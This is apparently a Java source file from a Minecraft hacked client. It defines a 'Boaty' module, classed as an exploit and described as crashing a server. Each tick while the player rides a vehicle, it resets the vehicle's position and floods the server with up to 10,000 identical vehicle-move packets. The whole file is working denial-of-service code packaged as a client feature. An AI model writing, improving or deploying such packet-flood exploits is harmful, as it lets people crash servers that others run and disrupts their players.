/*
 * This file is part of the atomic client distribution.
 * Copyright (c) 2021-2021 0x150.
 */

package me.x150.sipprivate.feature.module.impl;

import me.x150.sipprivate.CoffeeClientMain;
import me.x150.sipprivate.feature.config.DoubleSetting;
import me.x150.sipprivate.feature.module.Module;
import me.x150.sipprivate.feature.module.ModuleType;
import me.x150.sipprivate.helper.render.Renderer;
import me.x150.sipprivate.helper.util.Utils;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;

import java.awt.Color;
import java.util.Objects;

public class Boaty extends Module {

    //    final SliderValue amount = this.config.create("Amount per tick", 2000, 1, 10000, 0);
    DoubleSetting amount  = this.config.create(new DoubleSetting.Builder(2000).name("Amount per tick").description("How many packets to send per tick").min(1).precision(0).max(10000).get());
    boolean       running = false;
    Vec3d         start   = null;

    public Boaty() {
        super("Boaty", "Uses boat movement to crash a server", ModuleType.EXPLOIT);
    }

    @Override public void tick() {
        if (Objects.requireNonNull(CoffeeClientMain.client.player).hasVehicle()) {
            Entity vehicle = CoffeeClientMain.client.player.getVehicle();
            if (!running) {
                BlockPos start = CoffeeClientMain.client.player.getBlockPos();
                this.start = new Vec3d(start.getX() + .5, start.getY() + 1, start.getZ() + .5);
            }
            running = true;
            Objects.requireNonNull(vehicle).updatePosition(start.x, start.y - 1, start.z);
            VehicleMoveC2SPacket p = new VehicleMoveC2SPacket(vehicle);
            for (int i = 0; i < amount.getValue(); i++) {
                Objects.requireNonNull(CoffeeClientMain.client.getNetworkHandler()).sendPacket(p);
            }
        } else {
            running = false;
        }
    }

    @Override public void enable() {
    }

    @Override public void disable() {
        this.start = null;
        running = false;
    }

    @Override public String getContext() {
        return running ? "Running" : "Not running";
    }

    @Override public void onWorldRender(MatrixStack matrices) {
        if (start != null) {
            Renderer.R3D.renderFilled(start.subtract(.1, .1, .1), new Vec3d(.2, .2, .2), Utils.getCurrentRGB(), matrices);
            Renderer.R3D.line(start, start.add(0, -1, 0), Color.RED, matrices);
        }
    }

    @Override public void onHudRender() {

    }

    @Override public void onFastTick_NWC() {
        if (CoffeeClientMain.client.world == null || CoffeeClientMain.client.player == null) {
            setEnabled(false);
        }
    }
}

